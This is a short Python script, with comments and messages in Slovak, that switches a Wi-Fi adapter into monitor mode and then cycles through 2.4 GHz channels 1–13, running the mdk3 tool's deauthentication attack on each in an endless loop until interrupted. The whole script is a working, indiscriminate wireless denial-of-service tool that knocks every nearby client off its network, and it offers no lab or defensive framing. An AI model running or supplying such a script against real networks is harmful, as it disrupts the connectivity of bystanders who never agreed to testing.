import subprocess
import time
import sys

def check_monitor_mode_support(interface):
    """Overí, či zariadenie podporuje monitor mód."""
    try:
        iw_output = subprocess.check_output(['iw', 'list'], text=True)
        if "monitor" in iw_output:
            print(f"[+] Adaptér {interface} podporuje monitor mód.")
            return True
        else:
            print(f"[-] Adaptér {interface} NEpodporuje monitor mód.")
            return False
    except subprocess.CalledProcessError:
        print("[!] Chyba pri získavaní informácií o zariadení.")
        return False

def set_monitor_mode(interface):
    """Nastaví Wi-Fi rozhranie do monitor módu."""
    try:
        print(f"[+] Nastavujem {interface} do monitor módu...")
        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'], check=True)
        subprocess.run(['sudo', 'iw', interface, 'set', 'monitor', 'control'], check=True)
        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'], check=True)
        print(f"[+] {interface} je teraz v monitor móde.")
        return True
    except subprocess.CalledProcessError:
        print("[!] Nepodarilo sa nastaviť monitor mód.")
        return False

def set_managed_mode(interface):
    """Vracia Wi-Fi adaptér späť do managed módu."""
    try:
        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'], check=True)
        subprocess.run(['sudo', 'iw', interface, 'set', 'type', 'managed'], check=True)
        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'], check=True)
        print(f"[+] {interface} nastavené späť do managed módu.")
    except subprocess.CalledProcessError:
        print("[!] Chyba pri nastavovaní managed módu.")

def set_channel(interface, channel):
    """Nastaví Wi-Fi kanál."""
    try:
        subprocess.run(['sudo', 'iw', 'dev', interface, 'set', 'channel', str(channel)], check=True)
    except subprocess.CalledProcessError:
        print(f"[!] Nepodarilo sa nastaviť kanál {channel}")

def deauth_on_channel(interface, channel):
    """Spustí deauth útok na danom kanáli pomocou mdk3."""
    print(f"[+] Spúšťam Deauth na kanáli {channel}")
    try:
        process = subprocess.Popen(['sudo', 'mdk3', interface, 'd', '-c', str(channel)],
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(5)
        process.terminate()
        process.wait()
    except Exception as e:
        print(f"[!] Chyba pri spustení deauth: {e}")

def main():
    interface = 'wlan1'  # zmeň podľa potreby

    if not check_monitor_mode_support(interface):
        response = input(f"[?] {interface} nepodporuje monitor mód. Chceš ho zapnúť? (Yes/No): ")
        if response.strip().lower() == 'yes':
            if not set_monitor_mode(interface):
                print("[X] Nepodarilo sa zapnúť monitor mód. Ukončujem skript.")
                sys.exit(1)
        else:
            print("[X] Monitor mód je potrebný. Skript končí.")
            sys.exit(1)
    else:
        set_monitor_mode(interface)

    channels = range(1, 14)  # 2.4 GHz kanály

    try:
        while True:
            for channel in channels:
                set_channel(interface, channel)
                deauth_on_channel(interface, channel)
    except KeyboardInterrupt:
        print("\n[!] Detekované prerušenie používateľom.")
    finally:
        set_managed_mode(interface)

if __name__ == "__main__":
    main()
